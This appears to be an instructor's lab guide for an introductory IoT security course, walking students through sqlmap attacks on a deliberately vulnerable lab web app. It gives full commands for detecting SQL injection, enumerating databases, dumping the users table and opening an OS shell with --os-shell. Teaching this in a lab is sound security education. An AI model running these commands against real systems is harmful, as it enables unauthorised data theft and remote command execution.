# SQLMAP Guide for IoTSec_Lab_M2

This guide walks you through using **sqlmap** to discover and exploit SQL injection vulnerabilities in the vulnerable IoT web application used in Module 2 (IoTSec_Lab_M2).  
It is designed for beginners and fits the scope of an introductory IoT Security course.

---

## 📌 Overview

`sqlmap` is an automated SQL injection detection and exploitation tool.  
In this lab, students will:

- Test API endpoints for SQL injection  
- Fingerprint the backend database  
- Enumerate databases and tables  
- Dump sensitive data (e.g., users)  
- Generate output reports for analysis  

Only **2–3 commands** are required for beginners, but additional optional commands provide deeper exploration.

---

## 🚀 Getting Started

### **Step 1: Basic Injection Test**

Checks whether the login form is vulnerable.

```bash
sqlmap -u "http://<PI-IP>:5000/login"
```

Look for output indicating:
- "parameter is vulnerable"
- "testing for SQL injection"
- "payloads found"

---

## 🔍 Step 2: Fingerprint the Database

Identifies the database type and version (SQLite, MySQL, etc.).

```bash
sqlmap -u "http://<PI-IP>:5000/login" --fingerprint
```

**Why this matters:**  
IoT applications often use lightweight databases (like SQLite); fingerprinting helps students understand that backend choice affects security.

---

## 🗄️ Step 3: List Available Databases

```bash
sqlmap -u "http://<PI-IP>:5000/login" --dbs
```

Example output:
```
available databases [2]:
[*] iotapp
[*] sqlite_master
```

---

## 📚 Step 4: Explore a Database

List tables inside a database (example: `iotapp`):

```bash
sqlmap -u "http://<PI-IP>:5000/login" -D iotapp --tables
```

---

## 🔡 Step 5: Enumerate Columns in a Table

```bash
sqlmap -u "http://<PI-IP>:5000/login" -D iotapp -T users --columns
```

---

## 🔓 Step 6: Dump Sensitive Data

Extracts the contents of the `users` table.

```bash
sqlmap -u "http://<PI-IP>:5000/login" -D iotapp -T users --dump
```

**This helps students see:**
- How weak password storage compromises accounts
- How SQL queries expose entire tables
- Why secure coding principles matter

---

## 📝 Step 7: Test Form-Based Injection

sqlmap can automatically detect and test all HTML forms.

```bash
sqlmap -u "http://<PI-IP>:5000/login" --forms
```

**Great for beginners because sqlmap handles:**
- Request methods (GET/POST)
- All input fields
- Payload selection

---

## 📁 Step 8: Save Output for Lab Reports

```bash
sqlmap -u "http://<PI-IP>:5000/login" --batch --output-dir=./sqlmap_report
```

**Use this folder for:**
- Screenshots
- Logs
- Data extraction evidence

---

## 🧪 Optional: Test API Endpoints

**Test sensor API:**
```bash
sqlmap -u "http://<PI-IP>:5000/api/sensor?value=1"
```

**Attempt OS Command Injection (teaching-purpose only):**
```bash
sqlmap -u "http://<PI-IP>:5000/api/sensor?value=1" --os-shell
```

*If the endpoint is not vulnerable, sqlmap will simply report it safely.*

---

## 📊 Verbose Mode (Optional for Learning)

```bash
sqlmap -u "http://<PI-IP>:5000/login" -v 3
```

**Students can see:**
- Payloads attempted
- Database responses
- Injection methods used

---

## 🧠 Beginner-Friendly 6-Step Workflow

```bash
# Step 1: Test for vulnerability
sqlmap -u "http://<PI-IP>:5000/login"

# Step 2: Fingerprint the database
sqlmap -u "http://<PI-IP>:5000/login" --fingerprint

# Step 3: List databases
sqlmap -u "http://<PI-IP>:5000/login" --dbs

# Step 4: List tables in iotapp database
sqlmap -u "http://<PI-IP>:5000/login" -D iotapp --tables

# Step 5: Dump users table
sqlmap -u "http://<PI-IP>:5000/login" -D iotapp -T users --dump

# Step 6: Save output
sqlmap -u "http://<PI-IP>:5000/login" --batch --output-dir=./report
```

**This sequence is perfect for a first-time IoT security student.**

---

## 📚 Additional Tips for Students

### Understanding Output
- **Green text** usually indicates success
- **Red text** may indicate errors or warnings
- **Yellow text** shows important information

### Common Flags Reference
| Flag | Purpose |
|------|---------|
| `-u` | Target URL |
| `--dbs` | List databases |
| `-D` | Specify database |
| `-T` | Specify table |
| `--dump` | Extract data |
| `--batch` | Non-interactive mode |
| `--forms` | Auto-detect forms |
| `-v` | Verbosity level (0-6) |

### Ethical Considerations
⚠️ **IMPORTANT:** Only use these techniques on:
- Systems you own
- Systems you have explicit permission to test
- Lab environments designed for learning

---

## 🎯 Learning Objectives

By completing this lab, students will:
1. Understand SQL injection attack vectors
2. Learn automated vulnerability testing
3. Recognize the importance of input validation
4. Appreciate secure coding practices
5. Gain hands-on penetration testing experience

---

## 📖 Further Reading

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [sqlmap Documentation](https://sqlmap.org/)
- [IoT Security Best Practices](https://www.cisa.gov/iot)

---

*Last Updated: Nov 20, 2025*